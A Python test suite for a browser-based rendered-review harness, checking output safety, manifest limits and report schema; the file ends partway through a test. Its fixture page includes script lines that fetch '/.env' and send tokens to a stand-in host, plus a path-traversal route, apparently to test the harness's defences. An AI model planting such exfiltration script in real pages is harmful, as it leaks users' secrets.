from __future__ import annotations

import hashlib
import json
import os
import shutil
import subprocess
import sys
import tempfile
import threading
import time
import unittest
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

from jsonschema import Draft202012Validator, FormatChecker


PACKAGE_ROOT = Path(__file__).resolve().parents[2]
HARNESS = PACKAGE_ROOT / "skills" / "design-dna" / "scripts" / "rendered_review.mjs"
SCHEMA = PACKAGE_ROOT / "maintainer" / "schemas" / "render-review.schema.json"
NODE = shutil.which("node")
ARTIFACT_METADATA_RESERVE_BYTES = 256 * 1024

EXPECTED_PROFILE_IDS = [
    "mobile-320-text-spacing",
    "mobile-375-light-touch",
    "mobile-430-light-touch",
    "intermediate-light",
    "desktop-short-light",
    "desktop-light",
    "desktop-dark",
    "desktop-reduced-motion",
    "desktop-forced-colors",
]

FIXTURE_HTML = """<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Rendered review fixture</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <main>
    <section aria-labelledby="fixture-title">
      <h1 id="fixture-title">Rendered <span class="fragment">evidence</span> fixture</h1>
      <p>A deterministic page for exercising the review harness.</p>
      <img alt="A one-pixel fixture expanded for crop inspection"
        src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=">
      <p><a href="#notes">Read the notes</a><button id="fixture-state" type="button"
        aria-expanded="false">Inspect state</button></p>
      <p><label>Fixture name <input id="fixture-name"></label></p>
      <p><label>Fixture choice <select id="fixture-choice">
        <option value="alpha">Alpha</option><option value="beta">Beta</option>
      </select></label></p>
      <p><label><input id="fixture-check" type="checkbox"> Confirm fixture</label></p>
      <p><a id="external-link" href="https://example.invalid/outside">External</a></p>
    </section>
    <section id="notes"><h2>Notes</h2><p>Human review remains required.</p></section>
  </main>
  <script>
    console.log("signed https://example.invalid/collect?token=SIGNED_SECRET#fragment C:\\\\Users\\\\alice\\\\secret.txt token=LOCAL_SECRET person@example.com");
    fetch("/.env").catch(() => {});
    fetch("https://example.invalid/collect?token=EXFIL_SECRET").catch(() => {});
    new WebSocket("wss://example.invalid/socket?token=WS_SECRET");
    setTimeout(() => { throw new Error("password=PAGE_SECRET C:\\\\Users\\\\alice\\\\private.txt"); }, 0);
    document.querySelector("#fixture-state").addEventListener("click", (event) => {
      event.currentTarget.setAttribute("aria-expanded", "true");
      event.currentTarget.textContent = "State inspected";
    });
  </script>
</body>
</html>
"""

FIXTURE_CSS = """
:root { color-scheme: light dark; font-family: Georgia, serif; }
* { box-sizing: border-box; }
body { margin: 0; padding: 3rem; background: #f4efe5; color: #202018; }
main { max-width: 54rem; margin: auto; }
h1 { font: 700 clamp(2.5rem, 8vw, 6rem)/.94 Georgia, serif; }
.fragment { color: #9b321f; }
img { width: 12rem; height: 8rem; object-fit: cover; }
a, button { display: inline-block; margin: 1rem 1rem 0 0; padding: .75rem 1rem; }
:focus-visible { outline: 4px solid #176b87; outline-offset: 4px; }
@media (prefers-color-scheme: dark) {
  body { background: #191814; color: #f4efe5; }
}
"""


def run_harness(
    *arguments: str,
    environment: dict[str, str] | None = None,
    timeout: int = 180,
) -> subprocess.CompletedProcess[str]:
    assert NODE is not None
    child_environment = os.environ.copy()
    child_environment.update(environment or {})
    return subprocess.run(
        [NODE, str(HARNESS), *arguments],
        cwd=PACKAGE_ROOT,
        env=child_environment,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="strict",
        timeout=timeout,
        check=False,
    )


def popen_harness(
    *arguments: str,
    environment: dict[str, str] | None = None,
) -> subprocess.Popen[str]:
    assert NODE is not None
    child_environment = os.environ.copy()
    child_environment.update(environment or {})
    return subprocess.Popen(
        [NODE, str(HARNESS), *arguments],
        cwd=PACKAGE_ROOT,
        env=child_environment,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        encoding="utf-8",
        errors="strict",
    )


def parse_single_json_line(raw: str) -> dict[str, object]:
    lines = [line for line in raw.splitlines() if line.strip()]
    if len(lines) != 1:
        raise AssertionError(f"Expected one JSON line, received {len(lines)}: {raw!r}")
    parsed = json.loads(lines[0])
    if not isinstance(parsed, dict):
        raise AssertionError(f"Expected a JSON object, received: {type(parsed)!r}")
    return parsed


def sha256_file(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as stream:
        for chunk in iter(lambda: stream.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def available_playwright_module_dir() -> Path | None:
    configured = os.environ.get("DESIGN_DNA_PLAYWRIGHT_MODULE_DIR")
    if configured:
        candidate = Path(configured).expanduser()
        if candidate.is_dir():
            return candidate.resolve()
    pinned_local = PACKAGE_ROOT / "maintainer" / "node_modules"
    if (pinned_local / "playwright" / "package.json").is_file():
        return pinned_local.resolve()
    if NODE is None:
        return None
    probe = subprocess.run(
        [NODE, "-e", "process.stdout.write(require.resolve('playwright/package.json'))"],
        cwd=PACKAGE_ROOT,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        check=False,
    )
    if probe.returncode:
        return None
    package_json = Path(probe.stdout.strip())
    return package_json.parent.parent.resolve() if package_json.is_file() else None


def available_browser_executable() -> Path | None:
    configured = os.environ.get("DESIGN_DNA_BROWSER_EXECUTABLE")
    if configured:
        candidate = Path(configured).expanduser()
        if candidate.is_file():
            return candidate.resolve()
    candidates: list[Path] = []
    if sys.platform == "win32":
        for variable in ("PROGRAMFILES", "PROGRAMFILES(X86)", "LOCALAPPDATA"):
            base = os.environ.get(variable)
            if not base:
                continue
            candidates.extend(
                [
                    Path(base) / "Google" / "Chrome" / "Application" / "chrome.exe",
                    Path(base) / "Microsoft" / "Edge" / "Application" / "msedge.exe",
                ]
            )
    elif sys.platform == "darwin":
        candidates.extend(
            [
                Path("/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"),
                Path("/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge"),
            ]
        )
    else:
        for name in (
            "google-chrome",
            "google-chrome-stable",
            "chromium",
            "chromium-browser",
            "microsoft-edge",
        ):
            located = shutil.which(name)
            if located:
                candidates.append(Path(located))
    system_browser = next(
        (candidate.resolve() for candidate in candidates if candidate.is_file()),
        None,
    )
    if system_browser is not None:
        return system_browser
    module_dir = available_playwright_module_dir()
    if NODE is None or module_dir is None:
        return None
    probe = subprocess.run(
        [
            NODE,
            "-e",
            (
                "const p=require('playwright').chromium.executablePath();"
                "process.stdout.write(p)"
            ),
        ],
        cwd=module_dir.parent,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        check=False,
    )
    candidate = Path(probe.stdout.strip()) if probe.returncode == 0 else None
    return candidate.resolve() if candidate is not None and candidate.is_file() else None


def make_site(root: Path, *, tall: bool = False) -> Path:
    site = root / "site"
    site.mkdir(parents=True)
    html = FIXTURE_HTML
    if tall:
        html = html.replace("</main>", '<div style="height:4000px"></div></main>')
    (site / "index.html").write_text(html, encoding="utf-8")
    (site / "styles.css").write_text(FIXTURE_CSS, encoding="utf-8")
    (site / ".env").write_text("API_KEY=ENV_SECRET", encoding="utf-8")
    (site / "vite.config.js").write_text("export default {}", encoding="utf-8")
    (site / ".design-dna").mkdir()
    (site / ".design-dna" / "source.json").write_text(
        '{"secret":"SOURCE_SECRET"}', encoding="utf-8"
    )
    (site / ".git").mkdir()
    (site / ".git" / "config").write_text("[credential]", encoding="utf-8")
    return site


def capture_profile(
    profile_id: str,
    width: int,
    height: int,
    *,
    touch: bool = False,
    color_scheme: str = "light",
    reduced_motion: str = "no-preference",
    forced_colors: str = "none",
    text_spacing: str = "none",
    zoom: str = "none",
) -> dict[str, object]:
    return {
        "id": profile_id,
        "label": profile_id.replace("-", " ").title(),
        "viewport": {
            "width": width,
            "height": height,
            "device_scale_factor": 1,
        },
        "is_mobile": touch,
        "has_touch": touch,
        "input_modalities": ["touch", "keyboard"]
        if touch
        else ["keyboard", "pointer"],
        "pointer": "coarse" if touch else "fine",
        "hover": "none" if touch else "hover",
        "color_scheme": color_scheme,
        "reduced_motion": reduced_motion,
        "forced_colors": forced_colors,
        "text_spacing": text_spacing,
        "zoom": zoom,
    }


def capture_scenario(
    scenario_id: str,
    profile_ids: list[str],
    *,
    route: str | None = None,
    interactions: list[dict[str, str]] | None = None,
) -> dict[str, object]:
    return {
        "id": scenario_id,
        "label": "Manifest scenario",
        "route": route,
        "route_label": "Fixture route",
        "state_label": "Reviewed interaction state",
        "profile_ids": profile_ids,
        "interactions": interactions or [],
    }


def write_capture_manifest(
    path: Path,
    profiles: list[dict[str, object]],
    scenarios: list[dict[str, object]],
    **extra: object,
) -> bytes:
    payload = json.dumps(
        {
            "schema_version": 1,
            "profiles": profiles,
            "scenarios": scenarios,
            **extra,
        },
        indent=2,
        sort_keys=True,
    ).encode()
    path.write_bytes(payload)
    return payload


def browser_environment(module_dir: Path) -> dict[str, str]:
    return {"DESIGN_DNA_PLAYWRIGHT_MODULE_DIR": str(module_dir)}


def browser_arguments(
    target: str | Path,
    output: Path,
    browser: Path,
    build_id: str,
    *extra: str,
) -> tuple[str, ...]:
    return (
        str(target),
        "--output",
        str(output),
        "--build-id",
        build_id,
        "--browser-executable",
        str(browser),
        "--settle-ms",
        "0",
        *extra,
    )


def output_lock_path(output: Path) -> Path:
    return output.parent / f".{output.name}.design-dna-render-review.lock"


def validate_report(output: Path) -> tuple[dict[str, object], Draft202012Validator]:
    schema = json.loads(SCHEMA.read_text(encoding="utf-8"))
    validator = Draft202012Validator(schema, format_checker=FormatChecker())
    report = json.loads((output / "render-review.json").read_text(encoding="utf-8"))
    validator.validate(report)
    return report, validator


class QuietHandler(BaseHTTPRequestHandler):
    def log_message(self, _format: str, *_args: object) -> None:
        return


@unittest.skipUnless(NODE, "Node.js is required for the rendered-review harness")
class RenderedReviewHarnessTests(unittest.TestCase):
    def test_help_declares_supported_node_floor(self) -> None:
        result = subprocess.run(
            [NODE, str(HARNESS), "--help"],
            cwd=PACKAGE_ROOT,
            text=True,
            capture_output=True,
            check=False,
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("Node.js 20 or newer", result.stdout)

    def require_browser(self) -> tuple[Path, Path]:
        module_dir = available_playwright_module_dir()
        browser = available_browser_executable()
        if module_dir is None:
            self.skipTest(
                "Real browser checks skipped explicitly: set "
                "DESIGN_DNA_PLAYWRIGHT_MODULE_DIR."
            )
        if browser is None:
            self.skipTest(
                "Real browser checks skipped explicitly: set "
                "DESIGN_DNA_BROWSER_EXECUTABLE."
            )
        return module_dir, browser

    def test_help_has_no_playwright_dependency(self) -> None:
        with tempfile.TemporaryDirectory(prefix="design-dna-empty-modules-") as empty:
            result = run_harness(
                "--help",
                environment={"DESIGN_DNA_PLAYWRIGHT_MODULE_DIR": empty},
            )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(result.stderr, "")
        self.assertIn("Usage:", result.stdout)
        self.assertIn("--max-artifact-bytes", result.stdout)
        self.assertIn("--capture-manifest", result.stdout)
        self.assertIn("--scroll-sweep", result.stdout)
        self.assertIn("ownership marker", result.stdout)
        self.assertIn("never emits an AI score", result.stdout)

    def test_maximum_default_route_contact_sheet_fits_metadata_reserve(self) -> None:
        module_dir, browser = self.require_browser()
        with tempfile.TemporaryDirectory(
            prefix="design-dna-render-multiroute-metadata-"
        ) as root:
            root_path = Path(root)
            site = make_site(root_path)
            for route_number in range(2, 9):
                shutil.copyfile(
                    site / "index.html",
                    site / f"route-{route_number}.html",
                )
            output = root_path / "review-output"
            routes = tuple(
                value
                for route_number in range(2, 9)
                for value in ("--route", f"/route-{route_number}.html")
            )
            result = run_harness(
                *browser_arguments(
                    site,
                    output,
                    browser,
                    "maximum-default-route-metadata",
                    *routes,
                ),
                environment=browser_environment(module_dir),
            )

            self.assertEqual(result.returncode, 0, result.stderr)
            report, _ = validate_report(output)
            self.assertEqual(len(report["routes"]), 8)
            self.assertEqual(len(report["captures"]), 72)
            contact_bytes = (output / "contact-sheet.html").stat().st_size
            marker_bytes = (output / ".design-dna-render-review.json").stat().st_size
            self.assertGreater(contact_bytes + marker_bytes, 64 * 1024)
            self.assertLessEqual(
                contact_bytes + marker_bytes,
                ARTIFACT_METADATA_RESERVE_BYTES,
            )

    def test_remote_scroll_sweep_is_rejected_before_browser_loading(self) -> None:
        with tempfile.TemporaryDirectory(
            prefix="design-dna-remote-scroll-sweep-"
        ) as root:
            root_path = Path(root)
            empty_modules = root_path / "empty-modules"
            empty_modules.mkdir()
            output = root_path / "review-output"
            result = run_harness(
                "https://example.invalid/",
                "--output",
                str(output),
                "--build-id",
                "remote-scroll-sweep",
                "--scroll-sweep",
                environment={
                    "DESIGN_DNA_PLAYWRIGHT_MODULE_DIR": str(empty_modules),
                    "NODE_PATH": "",
                },
            )

            self.assertFalse(output.exists())
            self.assertFalse(output_lock_path(output).exists())

        self.assertEqual(result.returncode, 2, result.stdout)
        self.assertEqual(result.stdout, "")
        payload = parse_single_json_line(result.stderr)
        self.assertFalse(payload["execution_ok"])
        self.assertTrue(payload["review_required"])
        self.assertFalse(payload["automatic_visual_quality_pass"])
        self.assertEqual(payload["quality_status"], "execution-failed")
        self.assertEqual(
            payload["error"]["code"],
            "remote-scroll-sweep-unsupported",
        )

    def test_capture_manifest_is_routed_from_runtime_guidance(self) -> None:
        guidance = (
            PACKAGE_ROOT
            / "skills"
            / "design-dna"
            / "references"
            / "quality"
            / "engineering-verification.md"
        ).read_text(encoding="utf-8")
        self.assertIn('--capture-manifest "CAPTURE_MANIFEST"', guidance)
        self.assertIn(
            "derive exact widths, heights, preferences, input conditions,",
            guidance,
        )
        self.assertIn(
            "built-in compatibility matrix as a\nconvenience for broad discovery",
            guidance,
        )
        self.assertNotIn("320, 375, and 430 CSS-pixel widths", guidance)
        self.assertIn("manual review still required", guidance)

    def test_host_capture_guidance_bounds_fallback_and_runtime_state(self) -> None:
        reference_root = (
            PACKAGE_ROOT
            / "skills"
            / "design-dna"
            / "references"
        )
        harness = (reference_root / "quality" / "render-harness.md").read_text(
            encoding="utf-8"
        )
        workflow = (reference_root / "workflow.md").read_text(encoding="utf-8")
        engineering = (
            reference_root / "quality" / "engineering-verification.md"
        ).read_text(encoding="utf-8")
        preship = (
            PACKAGE_ROOT
            / "skills"
            / "design-dna"
            / "templates"
            / "preship-gate.md"
        ).read_text(encoding="utf-8")

        self.assertIn("A hang, incorrect device-pixel crop", harness)
        self.assertIn("Do not multiply capture matrices", harness)
        self.assertIn("operating system's temporary area", harness)
        self.assertIn("every success, failure, timeout, and interruption", harness)
        self.assertIn("Stop task-owned preview servers", harness)
        self.assertIn("deployable/public", workflow)
        self.assertIn("Point servers,\n   packaging, and rendered capture", workflow)
        self.assertIn("PROJECT/.design-dna/` beside `PROJECT/site/", engineering)
        self.assertIn("the name is an example, not a\nrequired convention", engineering)
        self.assertIn("validated additive merge or status-only update", engineering)
        self.assertIn("legacy migration or forced refresh retains", engineering)
        self.assertIn("The deployed or served public root excludes", preship)

    def test_missing_playwright_is_structured_and_cleans_owned_transaction(self) -> None:
        with tempfile.TemporaryDirectory(prefix="design-dna-missing-playwright-") as root:
            root_path = Path(root)
            module_dir = root_path / "empty-modules"
            module_dir.mkdir()
            output = root_path / "review-output"
            result = run_harness(
                "https://example.invalid/?token=RAW_SECRET#fragment",
                "--output",
                str(output),
                "--build-id",
                "missing-playwright-test",
                environment={
                    "DESIGN_DNA_PLAYWRIGHT_MODULE_DIR": str(module_dir),
                    "NODE_PATH": "",
                },
            )
            self.assertFalse(output.exists())
            self.assertFalse(output_lock_path(output).exists())
            self.assertEqual(
                list(root_path.glob(".review-output.design-dna-transaction-*")), []
            )

        self.assertEqual(result.returncode, 3, result.stdout)
        self.assertEqual(result.stdout, "")
        self.assertNotIn("RAW_SECRET", result.stderr)
        payload = parse_single_json_line(result.stderr)
        self.assertFalse(payload["execution_ok"])
        self.assertTrue(payload["review_required"])
        self.assertFalse(payload["automatic_visual_quality_pass"])
        self.assertEqual(payload["quality_status"], "execution-failed")
        self.assertEqual(payload["error"]["code"], "playwright-unavailable")

    def test_output_safety_marker_refusal_and_local_source_separation(self) -> None:
        with tempfile.TemporaryDirectory(prefix="design-dna-output-safety-") as root:
            root_path = Path(root)
            site = make_site(root_path)

            invalid_target = run_harness(
                "ftp://example.test/",
                "--output",
                str(root_path / "invalid-target-output"),
                "--build-id",
                "invalid-target",
            )
            self.assertEqual(invalid_target.returncode, 2)
            self.assertEqual(
                parse_single_json_line(invalid_target.stderr)["error"]["code"],
                "invalid-target-scheme",
            )

            occupied = root_path / "occupied"
            occupied.mkdir()
            (occupied / "client-file.txt").write_text("preserve", encoding="utf-8")
            occupied_result = run_harness(
                str(site),
                "--output",
                str(occupied),
                "--build-id",
                "occupied-output",
            )
            self.assertEqual(occupied_result.returncode, 2)
            self.assertEqual(
                parse_single_json_line(occupied_result.stderr)["error"]["code"],
                "output-exists",
            )

            documents_like = root_path / "Documents" / "Prospective Client"
            documents_like.mkdir(parents=True)
            arbitrary = documents_like / "proposal.docx"
            arbitrary.write_text("must survive", encoding="utf-8")
            arbitrary_result = run_harness(
                "https://example.invalid/",
                "--output",
                str(documents_like),
                "--build-id",
                "arbitrary-replacement",
                "--replace",
            )
            self.assertEqual(arbitrary_result.returncode, 2)
            self.assertEqual(
                parse_single_json_line(arbitrary_result.stderr)["error"]["code"],
                "output-not-owned",
            )
            self.assertEqual(arbitrary.read_text(encoding="utf-8"), "must survive")

            inside_source = site / "review-output"
            inside_result = run_harness(
                str(site),
                "--output",
                str(inside_source),
                "--build-id",
                "inside-source",
            )
            self.assertEqual(inside_result.returncode, 2)
            self.assertEqual(
                parse_single_json_line(inside_result.stderr)["error"]["code"],
                "output-source-overlap",
            )

            ancestor_result = run_harness(
                str(site),
                "--output",
                str(root_path),
                "--build-id",
                "source-ancestor",
                "--replace",
            )
            self.assertEqual(ancestor_result.returncode, 2)
            self.assertEqual(
                parse_single_json_line(ancestor_result.stderr)["error"]["code"],
                "output-source-overlap",
            )

            traversal_result = run_harness(
                str(site),
                "--route",
                "/%2e%2e/outside.html",
                "--output",
                str(root_path / "traversal-output"),
                "--build-id",
                "traversal-route",
            )
            self.assertEqual(traversal_result.returncode, 2)
            self.assertEqual(
                parse_single_json_line(traversal_result.stderr)["error"]["code"],
                "unsafe-local-route",
            )

            workspace_result = run_harness(
                "https://example.test/",
                "--output",
                str(PACKAGE_ROOT),
                "--build-id",
                "unsafe-workspace",
                "--replace",
            )
            self.assertEqual(workspace_result.returncode, 2)
            self.assertEqual(
                parse_single_json_line(workspace_result.stderr)["error"]["code"],
                "unsafe-output",
            )

            route_limited_arguments = [
                "https://example.invalid/",
                "--output",
                str(root_path / "route-limit-output"),
                "--build-id",
                "default-route-limit",
            ]
            for index in range(8):
                route_limited_arguments.extend(["--route", f"/route-{index}"])
            route_limited = run_harness(*route_limited_arguments)
            self.assertEqual(route_limited.returncode, 2)
            route_error = parse_single_json_line(route_limited.stderr)["error"]
            self.assertEqual(route_error["code"], "too-many-routes")
            self.assertEqual(route_error["details"]["maximum"], 7)
            self.assertEqual(route_error["details"]["default_profile_count"], 9)
            self.assertEqual(route_error["details"]["maximum_captures"], 72)

    def test_source_snapshot_quota_fails_before_browser_and_excludes_output(self) -> None:
        with tempfile.TemporaryDirectory(prefix="design-dna-source-quota-") as root:
            root_path = Path(root)
            site = root_path / "site"
            site.mkdir()
            (site / "index.html").write_text("x" * 800, encoding="utf-8")
            (site / "extra.txt").write_text("y" * 800, encoding="utf-8")
            output = root_path / "output"
            result = run_harness(
                str(site),
                "--output",
                str(output),
                "--build-id",
                "source-quota",
                "--max-source-bytes",
                "1024",
                "--max-source-file-bytes",
                "1024",
            )
            self.assertEqual(result.returncode, 2)
            payload = parse_single_json_line(result.stderr)
            self.assertEqual(payload["quality_status"], "execution-incomplete")
            self.assertEqual(payload["error"]["code"], "source-byte-limit-exceeded")
            self.assertFalse(output.exists())
            self.assertFalse(output_lock_path(output).exists())

    def test_report_schema_is_valid_and_forbids_automatic_quality_passes(self) -> None:
        schema = json.loads(SCHEMA.read_text(encoding="utf-8"))
        Draft202012Validator.check_schema(schema)
        validator = Draft202012Validator(schema, format_checker=FormatChecker())
        invalid_claim = {
            "schema_version": 3,
            "tool": {
                "name": "design-dna-rendered-review",
                "version": "3.0.0",
                "report_schema": "render-review.schema.json",
            },
            "execution_ok": True,
            "review_required": True,
            "automatic_visual_quality_pass": True,
            "quality_status": "manual-review-required",
        }
        errors = list(validator.iter_errors(invalid_claim))
        self.assertTrue(
            any(
                list(error.path) == ["automatic_visual_quality_pass"]
                and error.validator == "const"
                and error.validator_value is False
                for error in errors
            )
        )

    def test_capture_manifest_rejects_unbounded_or_unsafe_contracts(self) -> None:
        with tempfile.TemporaryDirectory(prefix="design-dna-manifest-invalid-") as root:
            root_path = Path(root)
            site = make_site(root_path)
            empty_modules = root_path / "empty-modules"
            empty_modules.mkdir()
            environment = {
                "DESIGN_DNA_PLAYWRIGHT_MODULE_DIR": str(empty_modules),
                "NODE_PATH": "",
            }
            profile = capture_profile("test-profile", 320, 640, touch=True)
            scenario = capture_scenario("test-scenario", ["test-profile"])

            cases: list[tuple[str, list[dict[str, object]], list[dict[str, object]], dict[str, object]]] = [
                (
                    "unknown-action",
                    [profile],
                    [
                        capture_scenario(
                            "test-scenario",
                            ["test-profile"],
                            interactions=[{"action": "evaluate", "selector": "body"}],
                        )
                    ],
                    {},
                ),
                (
                    "selector-size",
                    [profile],
                    [
                        capture_scenario(
                            "test-scenario",
                            ["test-profile"],
                            interactions=[{"action": "focus", "selector": "#" + "x" * 512}],
                        )
                    ],
                    {},
                ),
                (
                    "value-size",
                    [profile],
                    [
                        capture_scenario(
                            "test-scenario",
                            ["test-profile"],
                            interactions=[
                                {
                                    "action": "fill",
                                    "selector": "#fixture-name",
                                    "value": "x" * 1001,
                                }
                            ],
                        )
                    ],
                    {},
                ),
                (
                    "interaction-count",
                    [profile],
                    [
                        capture_scenario(
                            "test-scenario",
                            ["test-profile"],
                            interactions=[
                                {"action": "focus", "selector": "#fixture-name"}
                                for _ in range(13)
                            ],
                        )
                    ],
                    {},
                ),
                (
                    "duplicate-profile",
                    [profile, dict(profile)],
                    [scenario],
                    {},
                ),
                (
                    "profile-count",
                    [
                        capture_profile(f"profile-{index}", 320, 640, touch=True)
                        for index in range(13)
                    ],
                    [capture_scenario("test-scenario", ["profile-0"])],
                    {},
                ),
                (
                    "capture-count",
                    [
                        capture_profile(f"profile-{index}", 320, 640, touch=True)
                        for index in range(12)
                    ],
                    [
                        capture_scenario(
                            f"scenario-{index}",
                            [f"profile-{profile_index}" for profile_index in range(12)],
                        )
                        for index in range(7)
                    ],
                    {},
                ),
                (
                    "extra-top-level",
                    [profile],
                    [scenario],
                    {"arbitrary_javascript": "alert(1)"},
                ),
            ]
            for index, (name, profiles, scenarios, extra) in enumerate(cases):
                with self.subTest(name=name):
                    manifest = root_path / f"{name}.json"
                    write_capture_manifest(manifest, profiles, scenarios, **extra)
                    output = root_path / f"invalid-output-{index}"
                    result = run_harness(
                        str(site),
                        "--output",
                        str(output),
                        "--build-id",
                        f"invalid-{name}",
                        "--capture-manifest",
                        str(manifest),
                        environment=environment,
                    )
                    self.assertEqual(result.returncode, 2, result.stderr)
                    self.assertEqual(
                        parse_single_json_line(result.stderr)["error"]["code"],
                        "capture-manifest-invalid",
                    )
                    self.assertFalse(output.exists())

            oversized = root_path / "oversized.json"
            oversized.write_bytes(b"{" + b" " * (64 * 1024) + b"}")
            oversized_result = run_harness(
                str(site),
                "--output",
                str(root_path / "oversized-output"),
                "--build-id",
                "oversized-manifest",
                "--capture-manifest",
                str(oversized),
                environment=environment,
            )
            self.assertEqual(oversized_result.returncode, 2)
            self.assertEqual(
                parse_single_json_line(oversized_result.stderr)["error"]["code"],
                "capture-manifest-invalid",
            )

            inside_source = site / "capture-manifest.json"
            write_capture_manifest(inside_source, [profile], [scenario])
            inside_result = run_harness(
                str(site),
                "--output",
                str(root_path / "inside-output"),
                "--build-id",
                "inside-manifest",
                "--capture-manifest",
                str(inside_source),
                environment=environment,
            )
            self.assertEqual(inside_result.returncode, 2)
            self.assertEqual(
                parse_single_json_line(inside_result.stderr)["error"]["code"],
                "capture-manifest-path-overlap",
            )

            remote_manifest = root_path / "remote-interaction.json"
            write_capture_manifest(
                remote_manifest,
                [profile],
                [
                    capture_scenario(
                        "remote-state",
                        ["test-profile"],
                        interactions=[
                            {"action": "click", "selector": "#fixture-state"}
                        ],
                    )
                ],
            )
            remote_result = run_harness(
                "https://example.invalid/",
                "--output",
                str(root_path / "remote-output"),
                "--build-id",
                "remote-interaction",
                "--capture-manifest",
                str(remote_manifest),
                environment=environment,
            )
            self.assertEqual(remote_result.returncode, 2)
            self.assertEqual(
                parse_single_json_line(remote_result.stderr)["error"]["code"],
                "remote-interaction-unsupported",
            )

            cross_origin_manifest = root_path / "cross-origin-route.json"
            write_capture_manifest(
                cross_origin_manifest,
                [profile],
                [
                    capture_scenario(
                        "cross-origin",
                        ["test-profile"],
                        route="https://other.invalid/path",
                    )
                ],
            )
            cross_origin_result = run_harness(
                "https://example.invalid/",
                "--output",
                str(root_path / "cross-origin-output"),
                "--build-id",
                "cross-origin-route",
                "--capture-manifest",
                str(cross_origin_manifest),
                environment=environment,
            )
            self.assertEqual(cross_origin_result.returncode, 2)
            self.assertEqual(
                parse_single_json_line(cross_origin_result.stderr)["error"]["code"],
                "cross-origin-route",
            )

    def test_manifest_route_declarations_use_manifest_capacity_and_match_as_sets(
        self,
    ) -> None:
        """A bounded manifest, not the default profile matrix, owns its route cap."""
        with tempfile.TemporaryDirectory(
            prefix="design-dna-manifest-route-contract-"
        ) as root:
            root_path = Path(root)
            site = make_site(root_path)
            empty_modules = root_path / "empty-modules"
            empty_modules.mkdir()
            environment = {
                "DESIGN_DNA_PLAYWRIGHT_MODULE_DIR": str(empty_modules),
                "NODE_PATH": "",
            }
            routes = ["/", *[f"/route-{index}/" for index in range(1, 10)]]
            profiles = [
                capture_profile("range-desktop", 1440, 900),
                capture_profile("range-mobile", 390, 844, touch=True),
                capture_profile("range-intermediate", 768, 900),
            ]
            scenarios = [
                capture_scenario(
                    f"route-{index:02d}",
                    [profile["id"] for profile in profiles]
                    if index < 10
                    else [profiles[0]["id"], profiles[1]["id"]],
                    route=route,
                )
                for index, route in enumerate(routes, start=1)
            ]
            self.assertEqual(
                sum(len(scenario["profile_ids"]) for scenario in scenarios),
                29,
            )
            manifest = root_path / "capture-manifest.json"
            write_capture_manifest(manifest, profiles, scenarios)

            matching_arguments = [
                str(site),
                "--output",
                str(root_path / "accepted-output"),
                "--build-id",
                "manifest-route-set-accepted",
                "--capture-manifest",
                str(manifest),
            ]
            for route in [*routes, routes[1]]:
                matching_arguments.extend(["--route", route])
            accepted = run_harness(
                *matching_arguments,
                environment=environment,
            )
            self.assertEqual(accepted.returncode, 3, accepted.stderr)
            self.assertEqual(
                parse_single_json_line(accepted.stderr)["error"]["code"],
                "playwright-unavailable",
            )

            mismatched_arguments = [
                str(site),
                "--output",
                str(root_path / "mismatched-output"),
                "--build-id",
                "manifest-route-set-mismatched",
                "--capture-manifest",
                str(manifest),
            ]
            for route in [*routes[:-1], "/unexpected/"]:
                mismatched_arguments.extend(["--route", route])
            mismatched = run_harness(
                *mismatched_arguments,
                environment=environment,
            )
            self.assertEqual(mismatched.returncode, 2, mismatched.stderr)
            mismatch_error = parse_single_json_line(mismatched.stderr)["error"]
            self.assertEqual(
                mismatch_error["code"],
                "capture-manifest-route-conflict",
            )
            self.assertEqual(mismatch_error["details"]["declared_route_count"], 10)
            self.assertEqual(mismatch_error["details"]["manifest_route_count"], 10)
            self.assertEqual(
                mismatch_error["details"]["missing_routes"],
                [routes[-1]],
            )
            self.assertEqual(
                mismatch_error["details"]["unexpected_routes"],
                ["/unexpected/"],
            )

    def test_manifest_capture_cap_precedes_default_route_limit(self) -> None:
        with tempfile.TemporaryDirectory(
            prefix="design-dna-manifest-capture-cap-"
        ) as root:
            root_path = Path(root)
            site = make_site(root_path)
            routes = ["/", *[f"/route-{index}/" for index in range(1, 10)]]
            profiles = [
                capture_profile(f"profile-{index}", 320 + index, 640, touch=True)
                for index in range(8)
            ]
            all_profile_ids = [profile["id"] for profile in profiles]
            scenarios = [
                capture_scenario(
                    f"route-{index:02d}",
                    all_profile_ids if index < 10 else [all_profile_ids[0]],
                    route=route,
                )
                for index, route in enumerate(routes, start=1)
            ]
            self.assertEqual(
                sum(len(scenario["profile_ids"]) for scenario in scenarios),
                73,
            )
            manifest = root_path / "over-cap.json"
            write_capture_manifest(manifest, profiles, scenarios)
            arguments = [
                str(site),
                "--output",
                str(root_path / "over-cap-output"),
                "--build-id",
                "manifest-capture-cap",
                "--capture-manifest",
                str(manifest),
            ]
            for route in routes:
                arguments.extend(["--route", route])

            result = run_harness(*arguments)
            self.assertEqual(result.returncode, 2, result.stderr)
            error = parse_single_json_line(result.stderr)["error"]
            self.assertEqual(error["code"], "capture-manifest-invalid")
            self.assertEqual(error["details"]["capture_count"], 73)

    def test_capture_manifest_profiles_interactions_and_manual_zoom_evidence(self) -> None:
        module_dir, browser = self.require_browser()
        with tempfile.TemporaryDirectory(prefix="design-dna-manifest-browser-") as root:
            root_path = Path(root)
            site = make_site(root_path)
            output = root_path / "review"
            manifest = root_path / "capture-manifest.json"
            profiles = [
                capture_profile(
                    "mobile-320-text",
                    320,
                    640,
                    touch=True,
                    text_spacing="wcag-1.4.12",
                ),
                capture_profile(
                    "mobile-375-dark",
                    375,
                    812,
                    touch=True,
                    color_scheme="dark",
                    reduced_motion="reduce",
                ),
                capture_profile(
                    "mobile-430-forced",
